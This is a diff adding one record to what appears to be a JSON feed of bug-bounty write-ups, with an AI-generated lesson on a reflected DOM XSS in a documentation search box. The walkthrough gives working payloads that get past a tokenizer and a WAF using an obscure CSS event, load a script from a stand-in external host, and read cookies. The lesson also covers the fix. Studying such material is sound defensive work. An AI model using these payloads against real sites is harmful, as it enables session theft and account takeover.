@@ -1,5 +1,45 @@
 [
   {
+    "id": "1e84ff1920e4",
+    "title": "No Click, No Login: A Reflected DOM XSS in a Documentation Search Box",
+    "url": "https://medium.com/@0xforgetmenot/no-click-no-login-a-reflected-dom-xss-in-a-documentation-search-box-c4471365af49",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "ForgetMeNot"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-22T01:55:50.000Z",
+    "added_at": "2026-10-22T01:59:15.203Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A Reflected DOM XSS in a documentation search box allowed for zero-click account takeover by bypassing a WAF and search tokenizer using an obscure CSS-triggered event.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from the application using the innerHTML property to display search terms that failed to match any documents. innerHTML is a JavaScript property (a way to access data) that tells the browser to treat a string as actual HTML code rather than plain text. Because the search engine, called lunr, first processes the input through a tokenizer (a tool that breaks text into words), standard payloads were broken. However, the attacker found that using a forward slash / as a separator and HTML entities (special codes like &#x3A; for a colon) allowed the payload to pass through the tokenizer and be reconstructed by the browser's parser.",
+      "walkthrough": "RECON\n1. The researcher identified a documentation site where the search box uses a URL parameter named q to filter results.\nURL: https://docs.target.example/?q=test\nWhy: A parameter is a piece of data in the URL (a web address) used to pass information to the site.\nDISCOVERY\n2. They examined the site's JavaScript code and found that it uses innerHTML to display terms that did not match any search results.\nCode: e.innerHTML += t.toString();\nWhy: innerHTML is a sink (a place where data is processed) that tells the browser to render text as HTML code, which can be dangerous if the text is controlled by a user.\n3. A basic test payload was sent to see if it would execute.\nPayload: ?q=security <img src=x onerror=alert(1)>\nWhy: This is a standard XSS (Cross-Site Scripting) test, which is a bug where an attacker runs code in another user's browser. It uses onerror (a command that runs if an image fails to load).\n4. The test failed because the search engine's tokenizer (a tool that splits text into words) broke the payload into pieces.\nWhy: The tokenizer saw spaces and brackets and treated them as separators, destroying the HTML structure.\nEXPLOITATION\n5. The researcher discovered that using a forward slash / instead of a space could bypass the tokenizer's word-splitting logic.\nPayload: <div/style='...'>\nWhy: The tokenizer didn't recognize the slash as a separator, keeping the tag intact.\n6. To bypass a WAF (a security filter that blocks common web attacks), the researcher tested for obscure event handlers.\nWhy: A WAF (Web Application Firewall) often only blocks common words like onclick or onerror.\n7. They found that oncontentvisibilityautostatechange was not blocked by the WAF.\nWhy: This is a rare event (a trigger for code) related to modern CSS (styling code) rendering that the WAF rules didn't know about.\n8. They used import() to load a malicious script from an external server.\nPayload: import('https://receiver.example/x.js')\nWhy: import() is a JavaScript function that loads external code; it was not blocked because the WAF only looked for script tags.\n9. The final payload combined these bypasses, using HTML entities (encoded characters) to hide colons from the tokenizer.\nPayload: ?q=security <div/style='content-visibility:auto;contain-intrinsic-size:1px' /oncontentvisibilityautostatechange=import('https&#x3A;//receiver.example/x.js')></div>\nWhy: The browser decodes the HTML entities (like &#x3A; becoming :) after the tokenizer is finished, allowing the code to run.\nIMPACT\n10. The researcher confirmed the script could steal sensitive data like cookies (small files used for login sessions).\nCode: document.cookie\nWhy: Since the script runs on the target's site, it has access to the user's private session information.",
+      "example": "Imagine a fictional site target.example that has a Help page. When you search for a word that doesn't exist, it says: 'No results found for: [your word]'. If the site uses document.getElementById('status').innerHTML = query;, an attacker can provide a query like <img src=x onerror=alert('Hacked')>. The browser sees the <img> tag, tries to load a non-existent image 'x', fails, and then runs the alert command. In this specific case, the attacker would use a URL like https://target.example/help?search=<img/src=x/onerror=alert(1)> to bypass simple filters that look for spaces.",
+      "takeaway": "Always look for sinks like innerHTML where user input is reflected back into the page. When standard payloads fail, investigate how the application processes text—tokenizers and parsers often have quirks that can be bypassed using alternative separators like / or HTML entities. Don't assume a WAF (Web Application Firewall) makes a site safe; they often rely on lists of 'bad words' and can be bypassed using obscure features like the oncontentvisibilityautostatechange event. Finally, remember that even static documentation sites can be dangerous if they use JavaScript to handle search or navigation.",
+      "fix": "The most effective fix is to stop using innerHTML to display user-controlled text. Instead, use textContent or innerText, which tell the browser to treat the input strictly as text, not as HTML code. Additionally, implement a strong Content Security Policy (CSP), which is a security header (a set of rules) that tells the browser which scripts are allowed to run, effectively blocking unauthorized external scripts even if an XSS vulnerability exists. \n\nExample of fixed code:\n// Instead of: element.innerHTML = userInput;\n// Use:\nelement.textContent = userInput;",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "“_A static docs site, a search-index tokeniser and one obscure DOM event turned a single link into arbitrary JavaScript in the target’s own origin. Here is how I found it, and what it took to weaponise.”_ ## TL;DR * The documentation site is **unauthenticated**, and its front-end copies the `?q=` search parameter into the page. * The search engine reports the query terms that matched **no** document, and the UI writes those terms into the page with `innerHTML` → **reflected DOM XSS**. * Two obstacles had to be cleared: the **search index tokenises the query** (so a classic `<img onerror=…>` is",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "8555a4baccd2",
     "title": "i HACKED nasa in just 4 days",
     "url": "https://medium.com/@choudharyyash127/i-hacked-nasa-in-just-4-days-1fb93bed2fd7",
